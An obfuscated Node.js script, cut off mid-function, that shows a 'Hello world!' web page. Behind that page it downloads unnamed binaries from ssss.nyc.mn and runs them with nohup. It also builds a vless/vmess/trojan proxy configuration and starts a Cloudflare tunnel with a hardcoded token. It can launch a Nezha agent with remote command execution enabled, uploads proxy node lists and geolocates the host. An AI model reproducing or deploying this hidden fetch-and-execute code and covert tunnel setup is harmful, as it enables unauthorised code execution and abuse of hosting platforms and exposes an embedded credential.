const _0x20f892=_0x307a;(function(_0x59578a,_0x35117a){const _0x471df3={_0x32f402:0x193,_0x5c53b1:0x134,_0x1f4bc4:0x16e,_0x3d0121:0x1aa},_0xe4d7fa=_0x307a,_0x6688c0=_0x59578a();while(!![]){try{const _0x3ad950=-parseInt(_0xe4d7fa(0x170))/0x1+-parseInt(_0xe4d7fa(0x150))/0x2*(-parseInt(_0xe4d7fa(_0x471df3._0x32f402))/0x3)+parseInt(_0xe4d7fa(0x1b7))/0x4+-parseInt(_0xe4d7fa(_0x471df3._0x5c53b1))/0x5+parseInt(_0xe4d7fa(0x12e))/0x6*(-parseInt(_0xe4d7fa(0x1c5))/0x7)+-parseInt(_0xe4d7fa(_0x471df3._0x1f4bc4))/0x8+parseInt(_0xe4d7fa(_0x471df3._0x3d0121))/0x9;if(_0x3ad950===_0x35117a)break;else _0x6688c0['push'](_0x6688c0['shift']());}catch(_0x2f05d7){_0x6688c0['push'](_0x6688c0['shift']());}}}(_0x5ad2,0xcfa9a));const express=require(_0x20f892(0x121)),app=express(),axios=require('axios'),os=require('os'),fs=require('fs'),path=require(_0x20f892(0x118)),{promisify}=require(_0x20f892(0x183)),exec=promisify(require(_0x20f892(0x110))[_0x20f892(0x124)]),{execSync}=require('child_process'),UPLOAD_URL=process[_0x20f892(0x12b)][_0x20f892(0x113)]||'',PROJECT_URL=process[_0x20f892(0x12b)][_0x20f892(0x119)]||'',AUTO_ACCESS=process[_0x20f892(0x12b)][_0x20f892(0x1b5)]||![],FILE_PATH=process[_0x20f892(0x12b)]['FILE_PATH']||_0x20f892(0x108),SUB_PATH=process[_0x20f892(0x12b)][_0x20f892(0x190)]||'dnm',PORT=process['env'][_0x20f892(0x14b)]||process['env'][_0x20f892(0x179)]||0xbb8,UUID=process['env'][_0x20f892(0x11d)]||_0x20f892(0x189),NEZHA_SERVER=process[_0x20f892(0x12b)][_0x20f892(0x197)]||'',NEZHA_PORT=process[_0x20f892(0x12b)][_0x20f892(0x15f)]||'',NEZHA_KEY=process[_0x20f892(0x12b)][_0x20f892(0x185)]||'',ARGO_DOMAIN=process[_0x20f892(0x12b)][_0x20f892(0x1b0)]||'leaflow2.chano.elementfx.com',ARGO_AUTH=process[_0x20f892(0x12b)][_0x20f892(0x18f)]||_0x20f892(0x184),ARGO_PORT=process[_0x20f892(0x12b)]['ARGO_PORT']||0x1f41,CFIP=process[_0x20f892(0x12b)][_0x20f892(0x182)]||_0x20f892(0x175),CFPORT=process[_0x20f892(0x12b)][_0x20f892(0x1b6)]||0x1bb,NAME=process['env']['NAME']||'leaf02';!fs[_0x20f892(0x12a)](FILE_PATH)?(fs['mkdirSync'](FILE_PATH),console['log'](FILE_PATH+_0x20f892(0x12d))):console[_0x20f892(0x1ad)](FILE_PATH+_0x20f892(0x152));function generateRandomName(){const _0x4d7501={_0x3be5f3:0x109},_0x14c37b=_0x20f892,_0x3cfe5f=_0x14c37b(0x177);let _0x78004a='';for(let _0x5d7e4b=0x0;_0x5d7e4b<0x6;_0x5d7e4b++){_0x78004a+=_0x3cfe5f[_0x14c37b(_0x4d7501._0x3be5f3)](Math[_0x14c37b(0x128)](Math[_0x14c37b(0x122)]()*_0x3cfe5f['length']));}return _0x78004a;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path[_0x20f892(0x13e)](FILE_PATH,npmName),phpPath=path[_0x20f892(0x13e)](FILE_PATH,phpName),webPath=path[_0x20f892(0x13e)](FILE_PATH,webName),botPath=path[_0x20f892(0x13e)](FILE_PATH,botName),subPath=path['join'](FILE_PATH,_0x20f892(0x143)),listPath=path[_0x20f892(0x13e)](FILE_PATH,_0x20f892(0x123)),bootLogPath=path[_0x20f892(0x13e)](FILE_PATH,_0x20f892(0x117)),configPath=path[_0x20f892(0x13e)](FILE_PATH,'config.json');function deleteNodes(){const _0x2ba84e={_0x31fdf3:0x12a,_0x2edacf:0x1bd,_0x2ad2cd:0x166},_0x168f1c=_0x20f892;try{if(!UPLOAD_URL)return;if(!fs[_0x168f1c(_0x2ba84e._0x31fdf3)](subPath))return;let _0xaa59a3;try{_0xaa59a3=fs['readFileSync'](subPath,'utf-8');}catch{return null;}const _0x23f8c=Buffer['from'](_0xaa59a3,_0x168f1c(0x163))[_0x168f1c(0x16d)]('utf-8'),_0x2796a7=_0x23f8c['split']('\x0a')['filter'](_0x39dc00=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x168f1c(0x127)](_0x39dc00));if(_0x2796a7[_0x168f1c(0x168)]===0x0)return;return axios[_0x168f1c(_0x2ba84e._0x2edacf)](UPLOAD_URL+_0x168f1c(0x153),JSON[_0x168f1c(0x198)]({'nodes':_0x2796a7}),{'headers':{'Content-Type':_0x168f1c(_0x2ba84e._0x2ad2cd)}})[_0x168f1c(0x19a)](_0x185da2=>{return null;}),null;}catch(_0x338416){return null;}}function cleanupOldFiles(){const _0x3e664b={_0x42ea1f:0x1b4},_0x1eeeae=_0x20f892;try{const _0x473b12=fs['readdirSync'](FILE_PATH);_0x473b12[_0x1eeeae(_0x3e664b._0x42ea1f)](_0x58c941=>{const _0x1ca9e1=_0x1eeeae,_0x3b587a=path[_0x1ca9e1(0x13e)](FILE_PATH,_0x58c941);try{const _0x25f711=fs['statSync'](_0x3b587a);_0x25f711[_0x1ca9e1(0x130)]()&&fs[_0x1ca9e1(0x140)](_0x3b587a);}catch(_0x4a3e84){}});}catch(_0x1f52d9){}}app[_0x20f892(0x107)]('/',function(_0x158bf8,_0x186470){const _0x23d708=_0x20f892;_0x186470[_0x23d708(0x139)](_0x23d708(0x1be));});function _0x5ad2(){const _0x31da24=['writeFileSync','710490vUqjRj','\x20-c\x20\x22','quic','taskkill\x20/f\x20/im\x20','finish','send','unlink','readFileSync','pop','true','join','createWriteStream','unlinkSync','has','\x20-p\x20','sub.txt','message','includes','arch','map','\x20is\x20running','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','https://arm64.ssss.nyc.mn/web','SERVER_PORT','https://arm64.ssss.nyc.mn/v1','from','2087','utf-8','2JQvHoD','Unknown','\x20already\x20exists','/api/delete-nodes','127.0.0.1','tls','basename','/tunnel.yml\x20run','8443','/vmess-argo?ed=2560','\x0a\x0avmess://','pkill\x20-f\x20\x22[','\x20successfully','web\x20running\x20error:\x20','\x0a\x20\x20tunnel:\x20','NEZHA_PORT','unshift','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','base64','text/plain;\x20charset=utf-8','Subscription\x20uploaded\x20successfully','application/json','http','length','platform','success','https://amd64.ssss.nyc.mn/agent','Error\x20in\x20startserver:','toString','4503896QYOPYt','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','661950CcDnoI','?security=tls&sni=','/trojan-argo','tunnel.yml','\x20failed:\x20','cdns.doon.eu.org','xtls-rprx-vision','abcdefghijklmnopqrstuvwxyz','country_code','PORT','push','automatic\x20access\x20task\x20added\x20successfully','Content-Type','direct','nohup\x20','Unhandled\x20error\x20in\x20startserver:','mkdirSync','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','CFIP','util','eyJhIjoiOWY0N2JiOTMxYzI1YjQwYmM1OTM0NmFhODE5MTI4OTYiLCJ0IjoiZTljZmFlMjAtNmZjNC00YmMyLWEwNzYtZTA4NWU4OTAxN2ZmIiwicyI6Ik1tVmtNbUV4TjJFdFpqZzBaQzAwTm1NNUxXRmtNMlF0WldZd01ETXlNRFk1TURJeSJ9','NEZHA_KEY','https://amd64.ssss.nyc.mn/bot','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','?encryption=none&security=tls&sni=','5302b333-9524-4019-a554-c72768653f6b','error','Skipping\x20adding\x20automatic\x20access\x20task','org','substring','App\x20is\x20running','ARGO_AUTH','SUB_PATH','fileName','block','4115766dCfDJa','http://ip-api.com/json/','Download\x20','firefox','NEZHA_SERVER','stringify','freedom','catch','\x20>/dev/null\x202>&1\x20&','tunnel.json','2096','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','ArgoDomain:','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','/vless-argo','NEZHA\x20variable\x20is\x20empty,skip\x20running','split','arm64','set','countryCode','https+local://8.8.8.8/dns-query','none','status','5770197fsrkpP','Empowerment\x20success\x20for\x20','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','log','/api/add-subscriptions','then','ARGO_DOMAIN','match','npm\x20running\x20error:\x20','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','forEach','AUTO_ACCESS','CFPORT','3543192NAaXSf','vless','trojan','config.yaml','Error\x20executing\x20command:\x20','arm','post','Hello\x20world!','.exe\x20>\x20nul\x202>&1','2083','&path=%2Ftrojan-argo%3Fed%3D2560#','/dev/null','blackhole','/vmess-argo','7MhNkyK','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','443','Add\x20automatic\x20access\x20task\x20faild:\x20','get','./tmp','charAt','false','--tls','\x0avless://','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','Empowerment\x20failed\x20for\x20','\x0aclient_secret:\x20','child_process','vmess','all','UPLOAD_URL','http\x20server\x20is\x20running\x20on\x20port:','close','response','boot.log','path','PROJECT_URL','ARGO_DOMAIN:','data','clear','UUID','2053','Error\x20downloading\x20files:','\x0a\x20\x20\x20\x20','express','random','list.txt','exec','del\x20/f\x20/q\x20','config.json','test','floor','https://amd64.ssss.nyc.mn/web','existsSync','env','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','\x20is\x20created','4087392khubjR','/config.json\x20>/dev/null\x202>&1\x20&','isFile','win32','stream'];_0x5ad2=function(){return _0x31da24;};return _0x5ad2();}async function generateConfig(){const _0x496f0f={_0x3eeab6:0x1a8,_0x45ee74:0x1b8,_0x425e01:0x1c4,_0x1aa78b:0x1a8,_0x1b47f0:0x1a1,_0x467c63:0x167,_0x1620b7:0x155,_0x2566ac:0x136,_0x12df60:0x111,_0x52d02c:0x154,_0x5adeb1:0x1b9,_0x42867c:0x136,_0x2653ef:0x1a7,_0x3e08d8:0x199,_0x281e9a:0x198},_0x5a92ac=_0x20f892,_0x577e88={'log':{'access':'/dev/null','error':_0x5a92ac(0x1c2),'loglevel':_0x5a92ac(_0x496f0f._0x3eeab6)},'inbounds':[{'port':ARGO_PORT,'protocol':_0x5a92ac(_0x496f0f._0x45ee74),'settings':{'clients':[{'id':UUID,'flow':_0x5a92ac(0x176)}],'decryption':_0x5a92ac(0x1a8),'fallbacks':[{'dest':0xbb9},{'path':'/vless-argo','dest':0xbba},{'path':_0x5a92ac(_0x496f0f._0x425e01),'dest':0xbbb},{'path':_0x5a92ac(0x172),'dest':0xbbc}]},'streamSettings':{'network':'tcp'}},{'port':0xbb9,'listen':_0x5a92ac(0x154),'protocol':'vless','settings':{'clients':[{'id':UUID}],'decryption':_0x5a92ac(0x1a8)},'streamSettings':{'network':'tcp','security':_0x5a92ac(0x1a8)}},{'port':0xbba,'listen':'127.0.0.1','protocol':_0x5a92ac(_0x496f0f._0x45ee74),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x5a92ac(_0x496f0f._0x1aa78b)},'streamSettings':{'network':'ws','security':'none','wsSettings':{'path':_0x5a92ac(_0x496f0f._0x1b47f0)}},'sniffing':{'enabled':!![],'destOverride':[_0x5a92ac(_0x496f0f._0x467c63),_0x5a92ac(_0x496f0f._0x1620b7),_0x5a92ac(_0x496f0f._0x2566ac)],'metadataOnly':![]}},{'port':0xbbb,'listen':'127.0.0.1','protocol':_0x5a92ac(_0x496f0f._0x12df60),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x5a92ac(0x1c4)}},'sniffing':{'enabled':!![],'destOverride':[_0x5a92ac(0x167),_0x5a92ac(0x155),'quic'],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x5a92ac(_0x496f0f._0x52d02c),'protocol':_0x5a92ac(_0x496f0f._0x5adeb1),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':'none','wsSettings':{'path':_0x5a92ac(0x172)}},'sniffing':{'enabled':!![],'destOverride':[_0x5a92ac(0x167),_0x5a92ac(0x155),_0x5a92ac(_0x496f0f._0x42867c)],'metadataOnly':![]}}],'dns':{'servers':[_0x5a92ac(_0x496f0f._0x2653ef)]},'outbounds':[{'protocol':_0x5a92ac(_0x496f0f._0x3e08d8),'tag':_0x5a92ac(0x17d)},{'protocol':_0x5a92ac(0x1c3),'tag':_0x5a92ac(0x192)}]};fs[_0x5a92ac(0x133)](path['join'](FILE_PATH,_0x5a92ac(0x126)),JSON[_0x5a92ac(_0x496f0f._0x281e9a)](_0x577e88,null,0x2));}function getSystemArchitecture(){const _0x366872={_0x5ccf73:0x1a4},_0x3ffc32=_0x20f892,_0x755dc6=os[_0x3ffc32(0x146)]();return _0x755dc6===_0x3ffc32(0x1bc)||_0x755dc6===_0x3ffc32(_0x366872._0x5ccf73)||_0x755dc6==='aarch64'?_0x3ffc32(0x1bc):'amd';}function downloadFile(_0x2c97fa,_0x3ad6d4,_0x543e6d){const _0x5b95c7={_0x2b2385:0x12a,_0x41413b:0x13f},_0x2ed6fd={_0x55ef29:0x11b},_0x4adccd={_0x56fd08:0x195,_0x17c3a7:0x174,_0x202bf2:0x18a},_0x177d0e={_0x26948f:0x1ad,_0x169ef1:0x195},_0x5a7283=_0x20f892,_0xc4ad17=_0x2c97fa;!fs[_0x5a7283(_0x5b95c7._0x2b2385)](FILE_PATH)&&fs[_0x5a7283(0x180)](FILE_PATH,{'recursive':!![]});const _0x527bdb=fs[_0x5a7283(_0x5b95c7._0x41413b)](_0xc4ad17);axios({'method':'get','url':_0x3ad6d4,'responseType':_0x5a7283(0x132)})[_0x5a7283(0x1af)](_0x6e677d=>{const _0x4801b6=_0x5a7283;_0x6e677d[_0x4801b6(_0x2ed6fd._0x55ef29)]['pipe'](_0x527bdb),_0x527bdb['on'](_0x4801b6(0x138),()=>{const _0xda08c2=_0x4801b6;_0x527bdb[_0xda08c2(0x115)](),console[_0xda08c2(_0x177d0e._0x26948f)](_0xda08c2(_0x177d0e._0x169ef1)+path[_0xda08c2(0x156)](_0xc4ad17)+_0xda08c2(0x15c)),_0x543e6d(null,_0xc4ad17);}),_0x527bdb['on']('error',_0x4cacfc=>{const _0x1e0ace=_0x4801b6;fs[_0x1e0ace(0x13a)](_0xc4ad17,()=>{});const _0x294b78=_0x1e0ace(_0x4adccd._0x56fd08)+path['basename'](_0xc4ad17)+_0x1e0ace(_0x4adccd._0x17c3a7)+_0x4cacfc['message'];console[_0x1e0ace(_0x4adccd._0x202bf2)](_0x294b78),_0x543e6d(_0x294b78);});})['catch'](_0x12a4c0=>{const _0x1d1e32=_0x5a7283,_0x2446b7='Download\x20'+path[_0x1d1e32(0x156)](_0xc4ad17)+_0x1d1e32(0x174)+_0x12a4c0[_0x1d1e32(0x144)];console[_0x1d1e32(0x18a)](_0x2446b7),_0x543e6d(_0x2446b7);});}async function downloadFilesAndRun(){const _0x8767d={_0x3887ca:0x147,_0x4c11f4:0x11f,_0x2a8628:0x1a3,_0x964a47:0x158,_0x3215f8:0x19d,_0x39a400:0x11e,_0x9feddc:0x181,_0xea78b4:0x133,_0x574c23:0x13e,_0x1824c9:0x135,_0x1b01a9:0x1b3,_0x5ec3fb:0x1ad,_0x523393:0x18a,_0x68a41b:0x19d,_0x517050:0x14e,_0x2186f1:0x10b,_0x2c0e92:0x17e,_0x5b447c:0x1ad,_0x39b8c6:0x1a2,_0x4cd686:0x17e,_0x28e25a:0x1b1,_0x1cf15e:0x1a0,_0x4d3ee2:0x162,_0x9e3cd4:0x19b,_0x69304a:0x18a},_0x1587f0={_0x3ee5ef:0x1b4},_0x153290={_0x5f1589:0x191},_0x18ad53=_0x20f892,_0x3f00cd=getSystemArchitecture(),_0x50c0fb=getFilesForArchitecture(_0x3f00cd);if(_0x50c0fb['length']===0x0){console[_0x18ad53(0x1ad)]('Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture');return;}const _0x78a7e3=_0x50c0fb[_0x18ad53(_0x8767d._0x3887ca)](_0x2a3ef1=>{return new Promise((_0x3a7a95,_0x286ba7)=>{const _0x5535d8=_0x307a;downloadFile(_0x2a3ef1[_0x5535d8(_0x153290._0x5f1589)],_0x2a3ef1['fileUrl'],(_0x6bd98e,_0xf935d3)=>{_0x6bd98e?_0x286ba7(_0x6bd98e):_0x3a7a95(_0xf935d3);});});});try{await Promise[_0x18ad53(0x112)](_0x78a7e3);}catch(_0x2b5acf){console[_0x18ad53(0x18a)](_0x18ad53(_0x8767d._0x4c11f4),_0x2b5acf);return;}function _0x43992c(_0x167e97){const _0x4fd7fd={_0x20e8bd:0x10e,_0x27fb52:0x1ad},_0x10e35f=_0x18ad53,_0x1f0007=0x1fd;_0x167e97[_0x10e35f(_0x1587f0._0x3ee5ef)](_0x7e6bd0=>{const _0xf19247=_0x10e35f;fs[_0xf19247(0x12a)](_0x7e6bd0)&&fs['chmod'](_0x7e6bd0,_0x1f0007,_0x206fa8=>{const _0x441f28=_0xf19247;_0x206fa8?console[_0x441f28(0x18a)](_0x441f28(_0x4fd7fd._0x20e8bd)+_0x7e6bd0+':\x20'+_0x206fa8):console[_0x441f28(_0x4fd7fd._0x27fb52)](_0x441f28(0x1ab)+_0x7e6bd0+':\x20'+_0x1f0007['toString'](0x8));});});}const _0x3252e6=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x43992c(_0x3252e6);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x63cd46=NEZHA_SERVER['includes'](':')?NEZHA_SERVER[_0x18ad53(_0x8767d._0x2a8628)](':')[_0x18ad53(0x13c)]():'',_0x373913=new Set([_0x18ad53(0x1c7),_0x18ad53(_0x8767d._0x964a47),_0x18ad53(_0x8767d._0x3215f8),'2087',_0x18ad53(0x1c0),_0x18ad53(_0x8767d._0x39a400)]),_0x4601b2=_0x373913[_0x18ad53(0x141)](_0x63cd46)?_0x18ad53(0x13d):_0x18ad53(0x10a),_0x14c4fb=_0x18ad53(0x10f)+NEZHA_KEY+_0x18ad53(0x10d)+NEZHA_SERVER+_0x18ad53(_0x8767d._0x9feddc)+_0x4601b2+_0x18ad53(0x187)+UUID;fs[_0x18ad53(_0x8767d._0xea78b4)](path[_0x18ad53(_0x8767d._0x574c23)](FILE_PATH,_0x18ad53(0x1ba)),_0x14c4fb);const _0x8a1847=_0x18ad53(0x17e)+phpPath+_0x18ad53(_0x8767d._0x1824c9)+FILE_PATH+_0x18ad53(_0x8767d._0x1b01a9);try{await exec(_0x8a1847),console[_0x18ad53(_0x8767d._0x5ec3fb)](phpName+'\x20is\x20running'),await new Promise(_0x3d3a94=>setTimeout(_0x3d3a94,0x3e8));}catch(_0xb2be5d){console[_0x18ad53(_0x8767d._0x523393)]('php\x20running\x20error:\x20'+_0xb2be5d);}}else{let _0x256b53='';const _0x3c7366=[_0x18ad53(0x1c7),_0x18ad53(_0x8767d._0x964a47),_0x18ad53(_0x8767d._0x68a41b),_0x18ad53(_0x8767d._0x517050),_0x18ad53(0x1c0),'2053'];_0x3c7366['includes'](NEZHA_PORT)&&(_0x256b53=_0x18ad53(_0x8767d._0x2186f1));const _0x239486=_0x18ad53(_0x8767d._0x2c0e92)+npmPath+'\x20-s\x20'+NEZHA_SERVER+':'+NEZHA_PORT+_0x18ad53(0x142)+NEZHA_KEY+'\x20'+_0x256b53+'\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&';try{await exec(_0x239486),console[_0x18ad53(_0x8767d._0x5b447c)](npmName+'\x20is\x20running'),await new Promise(_0x2f0a2d=>setTimeout(_0x2f0a2d,0x3e8));}catch(_0x703fda){console[_0x18ad53(0x18a)](_0x18ad53(0x1b2)+_0x703fda);}}}else console['log'](_0x18ad53(_0x8767d._0x39b8c6));const _0x3fbf15=_0x18ad53(_0x8767d._0x4cd686)+webPath+'\x20-c\x20'+FILE_PATH+_0x18ad53(0x12f);try{await exec(_0x3fbf15),console['log'](webName+'\x20is\x20running'),await new Promise(_0x328335=>setTimeout(_0x328335,0x3e8));}catch(_0x2ec57e){console[_0x18ad53(0x18a)](_0x18ad53(0x15d)+_0x2ec57e);}if(fs[_0x18ad53(0x12a)](botPath)){let _0x13dbc4;if(ARGO_AUTH['match'](/^[A-Z0-9a-z=]{120,250}$/))_0x13dbc4=_0x18ad53(0x149)+ARGO_AUTH;else ARGO_AUTH[_0x18ad53(_0x8767d._0x28e25a)](/TunnelSecret/)?_0x13dbc4=_0x18ad53(0x12c)+FILE_PATH+_0x18ad53(0x157):_0x13dbc4=_0x18ad53(_0x8767d._0x1cf15e)+FILE_PATH+_0x18ad53(_0x8767d._0x4d3ee2)+ARGO_PORT;try{await exec('nohup\x20'+botPath+'\x20'+_0x13dbc4+_0x18ad53(_0x8767d._0x9e3cd4)),console[_0x18ad53(0x1ad)](botName+_0x18ad53(0x148)),await new Promise(_0x5b12e7=>setTimeout(_0x5b12e7,0x7d0));}catch(_0x24d020){console[_0x18ad53(_0x8767d._0x69304a)]('Error\x20executing\x20command:\x20'+_0x24d020);}}await new Promise(_0x449d65=>setTimeout(_0x449d65,0x1388));}function getFilesForArchitecture(_0x29dbd2){const _0x10d5b7={_0x387ccd:0x1bc,_0x266b7d:0x160,_0x58b046:0x1bc,_0x310a9c:0x14c},_0x3fe621=_0x20f892;let _0x27d1bb;_0x29dbd2===_0x3fe621(_0x10d5b7._0x387ccd)?_0x27d1bb=[{'fileName':webPath,'fileUrl':_0x3fe621(0x14a)},{'fileName':botPath,'fileUrl':'https://arm64.ssss.nyc.mn/bot'}]:_0x27d1bb=[{'fileName':webPath,'fileUrl':_0x3fe621(0x129)},{'fileName':botPath,'fileUrl':_0x3fe621(0x186)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x292ea1=_0x29dbd2==='arm'?'https://arm64.ssss.nyc.mn/agent':_0x3fe621(0x16b);_0x27d1bb[_0x3fe621(_0x10d5b7._0x266b7d)]({'fileName':npmPath,'fileUrl':_0x292ea1});}else{const _0x24cbc5=_0x29dbd2===_0x3fe621(_0x10d5b7._0x58b046)?_0x3fe621(_0x10d5b7._0x310a9c):'https://amd64.ssss.nyc.mn/v1';_0x27d1bb[_0x3fe621(0x160)]({'fileName':phpPath,'fileUrl':_0x24cbc5});}}return _0x27d1bb;}function argoType(){const _0x30785a={_0x235973:0x1ad,_0x3fed38:0x145,_0x215567:0x1ac},_0x314875=_0x20f892;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x314875(_0x30785a._0x235973)](_0x314875(0x16f));return;}if(ARGO_AUTH[_0x314875(_0x30785a._0x3fed38)]('TunnelSecret')){fs[_0x314875(0x133)](path[_0x314875(0x13e)](FILE_PATH,_0x314875(0x19c)),ARGO_AUTH);const _0x5ce252=_0x314875(0x15e)+ARGO_AUTH[_0x314875(0x1a3)]('\x22')[0xb]+'\x0a\x20\x20credentials-file:\x20'+path['join'](FILE_PATH,_0x314875(0x19c))+_0x314875(0x19e)+ARGO_DOMAIN+_0x314875(_0x30785a._0x215567)+ARGO_PORT+_0x314875(0x161);fs['writeFileSync'](path['join'](FILE_PATH,_0x314875(0x173)),_0x5ce252);}else console[_0x314875(_0x30785a._0x235973)]('ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel');}async function extractDomains(){const _0x1b3c15={_0x18caf8:0x11a,_0x591962:0x1a3,_0x6954a:0x1ad,_0x5ac09d:0x17e,_0x18e054:0x19b,_0x4ebba8:0x18a},_0x4eefeb={_0x1bf6b6:0x107,_0x34eb5a:0x11b,_0x5c3133:0x107,_0xbcceef:0x194,_0x468606:0x16a,_0x4d7434:0x151},_0x1227c4={_0x4eceba:0x1bf,_0x4458b1:0x15b,_0x254959:0x109,_0x13f972:0x18d},_0x3e5848=_0x20f892;let _0x4013cc;if(ARGO_AUTH&&ARGO_DOMAIN)_0x4013cc=ARGO_DOMAIN,console['log'](_0x3e5848(_0x1b3c15._0x18caf8),_0x4013cc),await _0x2f6d5b(_0x4013cc);else try{const _0x41c380=fs['readFileSync'](path[_0x3e5848(0x13e)](FILE_PATH,'boot.log'),'utf-8'),_0x4f45bf=_0x41c380[_0x3e5848(_0x1b3c15._0x591962)]('\x0a'),_0x26f995=[];_0x4f45bf['forEach'](_0xb1818=>{const _0x1f6fff=_0x3e5848,_0x16e192=_0xb1818[_0x1f6fff(0x1b1)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x16e192){const _0x257dbf=_0x16e192[0x1];_0x26f995['push'](_0x257dbf);}});if(_0x26f995[_0x3e5848(0x168)]>0x0)_0x4013cc=_0x26f995[0x0],console['log'](_0x3e5848(0x19f),_0x4013cc),await _0x2f6d5b(_0x4013cc);else{console[_0x3e5848(_0x1b3c15._0x6954a)]('ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain'),fs[_0x3e5848(0x140)](path[_0x3e5848(0x13e)](FILE_PATH,_0x3e5848(0x117)));async function _0x5a85dc(){const _0x401344=_0x3e5848;try{process[_0x401344(0x169)]===_0x401344(0x131)?await exec(_0x401344(0x137)+botName+_0x401344(_0x1227c4._0x4eceba)):await exec(_0x401344(_0x1227c4._0x4458b1)+botName[_0x401344(_0x1227c4._0x254959)](0x0)+']'+botName[_0x401344(_0x1227c4._0x13f972)](0x1)+'\x22\x20>\x20/dev/null\x202>&1');}catch(_0x4d86c8){}}_0x5a85dc(),await new Promise(_0x1c4edd=>setTimeout(_0x1c4edd,0xbb8));const _0x30e3fd=_0x3e5848(0x1a0)+FILE_PATH+_0x3e5848(0x162)+ARGO_PORT;try{await exec(_0x3e5848(_0x1b3c15._0x5ac09d)+botPath+'\x20'+_0x30e3fd+_0x3e5848(_0x1b3c15._0x18e054)),console[_0x3e5848(0x1ad)](botName+'\x20is\x20running'),await new Promise(_0x478d05=>setTimeout(_0x478d05,0xbb8)),await extractDomains();}catch(_0x22e782){console[_0x3e5848(0x18a)](_0x3e5848(0x1bb)+_0x22e782);}}}catch(_0x4ffa7a){console[_0x3e5848(_0x1b3c15._0x4ebba8)]('Error\x20reading\x20boot.log:',_0x4ffa7a);}async function _0x1f6745(){const _0xa6857b=_0x3e5848;try{const _0x53c83e=await axios[_0xa6857b(_0x4eefeb._0x1bf6b6)]('https://ipapi.co/json/',{'timeout':0xbb8});if(_0x53c83e['data']&&_0x53c83e[_0xa6857b(_0x4eefeb._0x34eb5a)]['country_code']&&_0x53c83e[_0xa6857b(0x11b)][_0xa6857b(0x18c)])return _0x53c83e[_0xa6857b(_0x4eefeb._0x34eb5a)][_0xa6857b(0x178)]+'_'+_0x53c83e[_0xa6857b(_0x4eefeb._0x34eb5a)][_0xa6857b(0x18c)];}catch(_0x174ad9){try{const _0xa53691=await axios[_0xa6857b(_0x4eefeb._0x5c3133)](_0xa6857b(_0x4eefeb._0xbcceef),{'timeout':0xbb8});if(_0xa53691['data']&&_0xa53691[_0xa6857b(0x11b)]['status']===_0xa6857b(_0x4eefeb._0x468606)&&_0xa53691[_0xa6857b(0x11b)][_0xa6857b(0x1a6)]&&_0xa53691['data'][_0xa6857b(0x18c)])return _0xa53691['data'][_0xa6857b(0x1a6)]+'_'+_0xa53691['data'][_0xa6857b(0x18c)];}catch(_0x1d4855){}}return _0xa6857b(_0x4eefeb._0x4d7434);}async function _0x2f6d5b(_0x262858){const _0x57ddb=await _0x1f6745(),_0x2dce84=NAME?NAME+'-'+_0x57ddb:_0x57ddb;return new Promise(_0x501fb1=>{const _0x4810ce={_0x10970f:0x159,_0x756fd6:0x10c,_0x3b0536:0x188,_0x35bc8e:0x15a,_0x58a7b0:0x163,_0x61656f:0x171,_0x3b51f5:0x1c1,_0x5499b4:0x16d},_0x10f4b0={_0x5bd3ae:0x16d,_0x1ca2cc:0x17c};setTimeout(()=>{const 